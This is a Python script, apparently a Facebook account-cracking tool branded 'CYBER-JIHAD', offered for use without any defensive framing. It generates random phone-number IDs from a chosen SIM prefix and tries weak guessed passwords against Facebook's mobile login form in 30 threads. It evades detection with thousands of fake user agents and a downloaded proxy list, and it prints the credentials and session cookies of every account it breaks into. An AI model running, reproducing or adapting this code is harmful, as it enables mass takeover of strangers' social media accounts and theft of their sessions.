import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
asu = random.choice([B,C,P,H])

oks=[]
cps=[]
loop=0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; Nokia C21 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/346.0.0.8.76;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Nokia C3 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.22.108;]"}
done = False
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
  
  
  
ugen = ["Mozilla/5.0 (Linux; Android 8; Realme 295Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3086.787 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 15; Realme 242 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.2007.744 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; LG-658L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.8173.807 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Infinix H917I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.1233.636 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Nokia Asha R903 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.9198.972 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4; Vivo 856 Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.7379.295 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8; Redmi Note 299T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.9118.770 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; RMX9266) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.5192.159 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Redmi Note Y613 Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.8777.706 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; Sony Xperia 751A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.7968.995 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6; Sony Xperia 660 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.4623.737 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; RMX2454) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.3609.239 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7; Redmi Note 573H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.5898.558 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 14; Honor 420T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.9323.210 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-S443B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.9056.363 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 14; Nokia Asha 679K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.7850.565 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Realme N105 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1063.638 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 14; Redmi Note U319 Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.1309.479 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; LG-545S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.1822.706 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8; Vivo G717 Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9816.848 Mobile Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 9_6_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.6566.284 Safari/537.36","Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.6004.330 Safari/537.36","Mozilla/5.0 (Windows NT 6.3; Win64; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.3264.296 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 16_6_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4737.306 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 8_4_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1687.798 Safari/537.36","Mozilla/5.0 (X11; Linux x64_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.5342.431 Safari/537.36","Mozilla/5.0 (X11; Linux x86_32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.8428.886 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.8788.273 Safari/537.36","Mozilla/5.0 (X11; Linux x32_32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.9063.458 Safari/537.36","Mozilla/5.0 (X11; Linux x86_32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3610.610 Safari/537.36",]


#-------------logo-----------------#
logo=(f'''{B}
d888888b  .d88b.  .88b  d88. d888888b {warna}
`~~88~~' .8P  Y8. 88'YbdP`88   `88'   
{B}   88    88    88 88  88  88    88    
{warna}   88    88    88 88  88  88    88    
 {B}  88    `8b  d8' 88  88  88   .88.   
{warna}   YP     `Y88P'  YP  YP  YP Y888888P 
{warna}--------------------------------------------{B}
ADMIN  {warna}:  {B}CYBER{warna}-{B}JIHAD
{warna}CEO    {warna}:  {B}YT {warna}-{B}JIHAD
{B}GIT    {warna}: {B} CYBER{warna}-{B}JIHAD
{warna}FB     {warna}: {B} CYBER{warna}-{B}JIHAD
{B}TOOLS  : {warna} {H}RANDOM {warna}{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def cy():
    clear()
    #os.system('xdg-open https://github.com/CYBER-JIHAD')
    print(f'{B}[{warna}01{B}] RANDOM CLONING ')
    print(f'{B}[{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f'{B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' THANKS FOR WATCHING:)')
#------------- bd clone def ----------#
def BD_CLONING():
    user=[]
    clear()
    print('EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input('ENTER SIM CODE >> ')
    linex()
    print('EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input('ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl=str(len(user))
        print(f'{B}TOTAL ID : '+tl)
        print(f'{warna}YOUR SIM CODE : '+code)
        print(f'{B}If No Result [On/Off] Airplane Mode ')
        linex()
        for psx in user:
            uid=code+psx
            psw=[psx,uid,uid[:7],uid[:6],uid[5:],uid[4:],'sadiya','jannat']
            Dipto.submit(method_crack,uid,psw)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    cy()
#------------ method crack def ---------#
def method_crack(uid,psw):
    global oks
    global cps
    global loop
    try:
        for pas in psw:
            session = requests.Session()
            asu = random.choice([B,C,P,H])
            sys.stdout.write(f'\r\r[TOMI] [{asu}%s{H}] \033[1;32mOK:[%s]'%(loop,len(oks)))
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://x.facebook.com').text
            log_data={
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":pas,
            "login":"Log In"}
            header_freefb={'authority': 'x.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[65:80]
            	print(f'\r\r\033[1;32m[JIHAD-OK] '+uid+' = '+pas+'\033[1;32m')
            	print(f'\033[1;32m[COOKIES] '+coki)
            	oks.append(uid)
            	break
            elif'checkpoint' in log_cookies:
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[65:80]
            	print('\r\r\033[1;31m[TOMI-CP] '+uid+' = '+pas+'\033[1;32m')
            	cps.append(uid)
            	break
            else:
                continue
        loop+=1
    except:
        pass
#-------------end----------------#


        
        
cy()